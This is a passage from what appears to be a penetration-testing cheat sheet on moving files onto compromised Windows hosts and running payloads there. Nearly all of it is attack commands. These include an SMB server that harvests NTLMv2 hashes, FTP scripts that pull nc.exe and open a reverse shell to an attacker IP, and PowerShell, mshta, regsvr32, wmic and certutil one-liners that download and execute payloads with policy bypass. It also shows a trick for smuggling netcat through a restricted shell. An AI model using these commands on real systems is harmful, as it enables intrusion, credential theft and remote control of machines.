```
/etc/init.d/pure-ftpd
```


### SMB Server setup

```

# Set up a SMB server using smbserver.py from impacket
smbserver.py SHARE_NAME path/to/share

# From target Windows:
net view \\KALI_IP
(Should display the SHARE_NAME)

dir \\KALI_IP\SHARE_NAME
copy \\KALI_IP\SHARE_NAME\file.exe .

# Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user
# can be usefull to PTH, or crack passwords

# Since Windows 10, you can't do anonymous smb server anymore
sudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username "peon" -password "peon"
net use Z: \\192.168.30.130\SDFR /user:peon peon
net use Z: /delete /y


impacket smbserver
net use z: \\attackerip\sharename

```


### Build a FTP and transfer file


```
# Set up a ftp downloading script on the target machine:
echo open IP 21 > ftp.txt
echo USER acknak>> ftp.txt
echo jLQRZy4gyLhmMqz2whTw>> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET wget.exe >> ftp.txt
echo bye >> ftp.txt

# Download the prepared file:
ftp -v -n -s:ftp.txt

# Start tftp server on Kali
aftpd start

# Transfer files from Kali to Windows (from windows terminal)
tftp -I IPADDRESS GET nameoffile.exe

# You can have a shell using this
echo open <attacker_ip> 21> ftp.txt
echo USER offsec>> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
nc.exe <attacker_ip> 1234 -e cmd.exe

```

### Downloading

```

# Execute file from a WebDav server:
cscript //E:jscript \\IP\folder\payload.txt

# Download using wget.vbs
cscript wget.vbs http://IP/file.exe file.exe

# One liner download file from WebServer:
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
powershell -exec bypass -c "(new-object System.Net.WebClient).DownloadFile('http://IP/file.exe','C:\Users\user\Desktop\file.exe')"

# Download from WebDAV Server:
powershell -exec bypass -f \\IP\folder\payload.ps1


```

### Using File


```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.10.14.11/Dropper/Windows/shell.exe" >>wget.ps1
echo $file = "shell.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
	
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1


```

### Downloading and Execution


```
# Method 1
mshta vbscript:Close(Execute("GetObject(""script:http://IP/payload.sct"")"))

# Method 2
mshta http://IP/payload.hta

# Method 3 (Using WebDav)
mshta \\IP\payload.hta

#Download and execute XSL using wmic
wmic os get /format:"https://webserver/payload.xsl"


# Download and execute over a WebServer:
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll

# Using WebDAV
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll

# Powershell Cmdlet
Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"

# Powershell One-Line
(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 

# In Memory Execution
IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')



```

### Multiple ways using certutil

```

# Multiple ways to download and execute files:
certutil -urlcache -split -f http://webserver/payload payload

# Execute a specific .dll:
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll

# Execute an .exe:
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe

```


### Tips for non-interactive shell using nc


```

# In a case of a non-interactive shell, you can transfer up to 64k of memory
# You can increase that size by compressing the willing file (let's say nc.exe) using:
upx -9 nc.exe

# nc.exe has now been compressed but remains functional
# Now convert it to text instructions using exe2bat
wine exe2bat.exe nc.exe nc.txt

# Then copy paste the content of nc.txt to the remote shell !
# You'll get a proper nc.exe using debug.exe from the target !

```
